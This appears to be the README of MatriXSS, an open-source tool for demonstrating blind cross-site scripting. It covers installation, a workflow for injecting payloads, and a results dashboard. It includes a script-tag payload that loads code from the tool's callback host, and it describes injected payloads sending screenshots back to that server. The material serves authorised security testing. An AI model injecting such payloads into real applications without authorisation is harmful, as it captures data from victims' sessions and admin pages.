## Introduction
**MatriXSS** is an open-source tool designed to demonstrate and communicate the impact of **blind Cross-Site Scripting (XSS)** vulnerabilities. Developed in collaboration with **Hackify**, this project aims to address the challenges organizations face in understanding and mitigating blind XSS attacks.

Blind XSS attacks occur when the payload is triggered in a context inaccessible to the attacker, such as an admin interface. MatriXSS bridges the gap between technical vulnerability details and actionable insights by providing **visual demonstrations** and reports.

---

## Key Features
- **Visual Impact Demonstrations**: Show the effects of blind XSS in a clear, "matrix-style" visualization.
- **Custom Payload Support**: Tailor payloads to simulate real-world attacks.
- **Stakeholder-Friendly Outputs**: Simplified visuals and summaries for non-technical audiences.

## Installation

### Prerequisites
- Python 3.8+
- Required libraries listed in `requirements.txt`

### Run locally
1. Clone the repository:
   ```bash
   git clone https://github.com/your-username/MatriXSS.git
   cd MatriXSS
   ```
2. Create a virtual environment:
   ```bash
   # Windows:
   python -m venv venv

   # Linux / MacOS:
   python3 -m venv venv
   ```
3. Activate the virtual enviroment
    ```bash
    # Windows
    venv\Scripts\activate
    
    # Linux / MacOS
    . ./.venv/bin/activate
   ``` 
4. Install dependencies to the virtual environment:
   ```bash
   # Windows:
   pip install -r requirements.txt

   # Linux / MacOS:
   venv/bin/pip install -r requirements.txt
   ```

5. Start the application
   ```bash
   # Windows:
   python .\main.py
   
   # Linux / MacOS
   python3 ./main.py
   ``` 
  On windows:
  
### Run in Docker
1. Clone the repository:
   ```bash
   git clone https://github.com/your-username/MatriXSS.git
   cd MatriXSS
   ```
2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
3. Docker compose
   ```bash
   docker compose up
   ```
---

## Usage
1. **Select a Payload**: Choose or customize a JavaScript payload to test a target.
2. **Inject Payload**: Manually input the payload into a vulnerable entry point (e.g., form fields or URL parameters).
3. **Callback Handling**: When a payload is executed, the tool automatically sends a **callback** to the server, capturing a screenshot of the vulnerability in action.
4. **Analyze Results**: Use the results page to review:
   - URL of the vulnerability.
   - Payload executed.
   - Screenshot of the impacted page.

### Basic Example
```bash
python matrixss.py --url http://example.com
```

## Technical Overview
### Core Workflow
1. **Payload Selection**: Choose a custom JavaScript payload to trigger vulnerabilities.
2. **Exploitation**: Inject payloads into potential entry points on a target web application.
3. **Data Collection**: Log vulnerabilities detected during the exploitation phase.
4. **Results Visualization**: Display findings in a visual, interactive format for stakeholders.

### Supported Tools
MatriXSS integrates concepts inspired by:
- **Toxxsin**: For advanced payload handling.
- **OWASP ZAP**: For general web application security.
- **XSSHunter**: For blind XSS-specific scenarios.

## Examples

### Manual XSS Test
1. Choose a payload:
   ```javascript
   '<script src="{APPLICATION_HOST_URL}"></script>'
   ```
2. Inject it into a vulnerable input field or URL parameter.
3. When the payload is triggered, the tool automatically:
   - Sends a callback to the server.
   - Captures a screenshot.
4. Review results on the **/results** page.


**Output**:
- Vulnerable URL: `/form`
- Payload: `alert('XSS Detected')`

### Visual Output
The tool generates a dashboard with:
- Screenshots of exploited pages.

---

## Design Philosophy
- **Accessibility**: Bridge technical complexity with intuitive visuals for non-technical audiences.
- **Modularity**: Enable integration with existing tools like OWASP ZAP or Jenkins.
- **Community-Driven**: Leverage open-source contributions to improve functionality and scope.

## Contributing
We welcome contributions! To contribute:
1. Fork the repository.
2. Create a branch for your feature:
   ```bash
   git checkout -b feature-name
   ```
3. Submit a pull request with a detailed description.

---

## Future Work
Planned improvements include:
- Metadata in screenshots to be added(add identifier to screenshots)
- Application screenshots need to be linked to specific user accounts
- Add functionality to register accounts
- Visualize where vulnerabilty is found.
- Implement security into webapplication.
